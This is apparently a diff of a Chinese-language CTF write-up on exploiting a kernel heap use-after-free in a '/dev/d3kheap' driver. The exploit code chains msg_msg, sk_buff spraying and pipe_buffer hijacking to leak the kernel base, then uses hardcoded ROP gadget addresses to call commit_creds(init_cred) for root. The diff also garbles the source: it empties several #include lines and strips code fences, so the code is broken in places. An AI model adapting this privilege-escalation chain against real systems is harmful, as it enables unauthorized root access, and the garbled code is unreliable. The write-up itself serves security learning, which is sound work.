@@ -153,12 +153,12 @@ pipe_buffer结构体
 #include <err.h>
 #include <errno.h>
 #include <fcntl.h>
-#include <inttypes.h>
+#include 
 #include <sched.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
+#include 
 #include <sys/ipc.h>
 #include <sys/msg.h>
 #include <sys/socket.h>
@@ -664,20 +664,10 @@ struct msg_msg {
  void *security;
  /* the actual message follows immediately */
 };
-```
-
-
-
-```
 struct msg_msgseg {
  struct msg_msgseg *next;
  /* the next part of the message follows immediately */
 };
-```
-
-
-
-```
 struct sk_buff {
  union {
   struct {
@@ -698,16 +688,11 @@ struct sk_buff {
  unsigned int  truesize;
  refcount_t  users;
 
-#ifdef CONFIG_SKB_EXTENSIONS
+    #ifdef CONFIG_SKB_EXTENSIONS
  /* only useable after checking ->active_extensions != 0 */
  struct skb_ext  *extensions;
-#endif
+    #endif
 };
-```
-
-
-
-```
 struct pipe_buffer {
  struct page *page;
  unsigned int offset, len;
@@ -715,23 +700,13 @@ struct pipe_buffer {
  unsigned int flags;
  unsigned long private;
 };
-```
-
-
-
-```
 struct pipe_buf_operations {
  int (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);
  void (*release)(struct pipe_inode_info *, struct pipe_buffer *);
  bool (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);
  bool (*get)(struct pipe_inode_info *, struct pipe_buffer *);
 };
-```
-
-
-
-```
-#define SOCKET_NUM 16
+    #define SOCKET_NUM 16
 
 size_t user_cs, user_ss, user_sp, user_rflags;
 // 保存用户态寄存器，退出内核态时使用
@@ -765,18 +740,13 @@ int main(int argc, char **argv, char **envp)
     
     dev_fd = open("/dev/d3kheap", O_RDONLY);
 }
-```
+    #define MSG_QUEUE_NUM 4096
+    #define PRIMARY_MSG_SIZE 96
+    #define SECONDARY_MSG_SIZE 0x400
+    #define MSG_TAG     0xAAAAAAAA
 
-
-
-```
-#define MSG_QUEUE_NUM 4096
-#define PRIMARY_MSG_SIZE 96
-#define SECONDARY_MSG_SIZE 0x400
-#define MSG_TAG     0xAAAAAAAA
-
-#define OBJ_ADD     0x1234
-#define OBJ_DEL     0xdead
+    #define OBJ_ADD     0x1234
+    #define OBJ_DEL     0xdead
 
 // 链表结构
 struct list_head
@@ -880,12 +850,7 @@ int main(int argc, char **argv, char **envp)
             del();
     }
 }
-```
-
-
-
-```
-#define SK_BUFF_NUM 128
+    #define SK_BUFF_NUM 128
 
 char fake_secondary_msg[704];
 // 构造msg_msg结构，向参数1结构体赋值
@@ -968,12 +933,7 @@ int main(int argc, char **argv, char **envp)
             sizeof(fake_secondary_msg)) < 0)
         errExit("failed to release sk_buff!");
 }
-```
-
-
-
-```
-#define VICTIM_MSG_TYPE     0x1337
+    #define VICTIM_MSG_TYPE     0x1337
 
 buildMsg((struct msg_msg *)fake_secondary_msg, 
             *(uint64_t*)"unr4v31.", *(uint64_t*)"unr4v31.", 
@@ -981,11 +941,6 @@ buildMsg((struct msg_msg *)fake_secondary_msg, 
     if (spraySkBuff(sk_sockets, fake_secondary_msg, 
             sizeof(fake_secondary_msg)) < 0)
         errExit("failed to spray sk_buff!");
-```
-
-
-
-```
 struct msg_msg  *nearby_msg;
 
 struct
@@ -1006,11 +961,6 @@ struct
     
     printf(" 33[32m 33[1m[+] addr of primary msg of msg nearby victim:  33[0m%llxn", 
             nearby_msg->m_list.prev);
-```
-
-
-
-```
 if (freeSkBuff(sk_sockets, fake_secondary_msg, 
             sizeof(fake_secondary_msg)) < 0)
         errExit("failed to release sk_buff!");
@@ -1037,11 +987,6 @@ if (freeSkBuff(sk_sockets, fake_secondary_msg, 
     printf(" 33[32m 33[1m[+] addr of msg next to victim:  33[0m%llxn", 
             nearby_msg_prim->m_list.next);
     printf(" 33[32m 33[1m[+] addr of msg UAF object:  33[0m%llxn", victim_addr);
-```
-
-
-
-```
 if (freeSkBuff(sk_sockets, fake_secondary_msg, 
             sizeof(fake_secondary_msg)) < 0)
         errExit("failed to release sk_buff!");
@@ -1059,13 +1004,8 @@ if (freeSkBuff(sk_sockets, fake_secondary_msg, 
     if (readMsg(msqid[victim_qid], &secondary_msg, 
                 sizeof(secondary_msg), VICTIM_MSG_TYPE) < 0)
         errExit("failed to receive secondary msg!");
-```
-
-
-
-```
-#define PIPE_NUM 256
-#define ANON_PIPE_BUF_OPS 0xffffffff8203fe40
+    #define PIPE_NUM 256
+    #define ANON_PIPE_BUF_OPS 0xffffffff8203fe40
 
 // pipe_buffer 结构体照着源码搬运过来
 struct pipe_buffer
@@ -1099,18 +1039,13 @@ pipe_buf_ptr = (struct pipe_buffer *) &fake_secondary_msg;
 
     printf(" 33[32m 33[1m[+] kernel base:  33[0m%llx  33[32m 33[1moffset:  33[0m%llxn", 
             kernel_base, kernel_offset);
-```
-
-
-
-```
-#define PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede
-#define POP_RDI_RET 0xffffffff810938f0
-#define INIT_CRED 0xffffffff82c6d580
-#define COMMIT_CREDS 0xffffffff810d25c0
-#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0
-#define PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede
-#define FREE_PIPE_INFO 0xffffffff81327570
+    #define PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede
+    #define POP_RDI_RET 0xffffffff810938f0
+    #define INIT_CRED 0xffffffff82c6d580
+    #define COMMIT_CREDS 0xffffffff810d25c0
+    #define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0
+    #define PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede
+    #define FREE_PIPE_INFO 0xffffffff81327570
 
 // 包含四个函数指针的结构体，照着源码搬运过来
 struct pipe_buf_operations
@@ -1168,54 +1103,49 @@ pipe_buf_ptr = (struct pipe_buffer *) fake_secondary_msg;
         close(pipe_fd[i][0]);
         close(pipe_fd[i][1]);
     }
-```
+    #define _GNU_SOURCE
+    #include <err.h>
+    #include <errno.h>
+    #include <fcntl.h>
+    #include 
+    #include <sched.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include 
+    #include <sys/ipc.h>
+    #include <sys/msg.h>
+    #include <sys/socket.h>
+    #include <sys/syscall.h>
 
+    #define PRIMARY_MSG_SIZE 96
+    #define SECONDARY_MSG_SIZE 0x400
 
+    #define PRIMARY_MSG_TYPE    0x41
+    #define SECONDARY_MSG_TYPE  0x42
+    #define VICTIM_MSG_TYPE     0x1337
+    #define MSG_TAG     0xAAAAAAAA
 
-```
-#define _GNU_SOURCE
-#include <err.h>
-#include <errno.h>
-#include <fcntl.h>
-#include <inttypes.h>
-#include <sched.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <sys/ipc.h>
-#include <sys/msg.h>
-#include <sys/socket.h>
-#include <sys/syscall.h>
+    #define SOCKET_NUM 16
+    #define SK_BUFF_NUM 128
+    #define PIPE_NUM 256
+    #define MSG_QUEUE_NUM 4096
 
-#define PRIMARY_MSG_SIZE 96
-#define SECONDARY_MSG_SIZE 0x400
+    #define OBJ_ADD     0x1234
+    #define OBJ_EDIT    0x4321
+    #define OBJ_SHOW  0xbeef
+    #define OBJ_DEL     0xdead
 
-#define PRIMARY_MSG_TYPE    0x41
-#define SECONDARY_MSG_TYPE  0x42
-#define VICTIM_MSG_TYPE     0x1337
-#define MSG_TAG     0xAAAAAAAA
-
-#define SOCKET_NUM 16
-#define SK_BUFF_NUM 128
-#define PIPE_NUM 256
-#define MSG_QUEUE_NUM 4096
-
-#define OBJ_ADD     0x1234
-#define OBJ_EDIT    0x4321
-#define OBJ_SHOW  0xbeef
-#define OBJ_DEL     0xdead
-
-#define PREPARE_KERNEL_CRED 0xffffffff810d2ac0
-#define INIT_CRED 0xffffffff82c6d580
-#define COMMIT_CREDS 0xffffffff810d25c0
-#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0
-#define POP_RDI_RET 0xffffffff810938f0
-#define ANON_PIPE_BUF_OPS 0xffffffff8203fe40
-#define FREE_PIPE_INFO 0xffffffff81327570
-#define POP_R14_POP_RBP_RET 0xffffffff81003364
-#define PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede
-#define CALL_RSI_PTR 0xffffffff8105acec
+    #define PREPARE_KERNEL_CRED 0xffffffff810d2ac0
+    #define INIT_CRED 0xffffffff82c6d580
+    #define COMMIT_CREDS 0xffffffff810d25c0
+    #define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0
+    #define POP_RDI_RET 0xffffffff810938f0
+    #define ANON_PIPE_BUF_OPS 0xffffffff8203fe40
+    #define FREE_PIPE_INFO 0xffffffff81327570
+    #define POP_R14_POP_RBP_RET 0xffffffff81003364
+    #define PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede
+    #define CALL_RSI_PTR 0xffffffff8105acec
 
 size_t user_cs, user_ss, user_sp, user_rflags;
 size_t kernel_offset, kernel_base = 0xffffffff81000000;
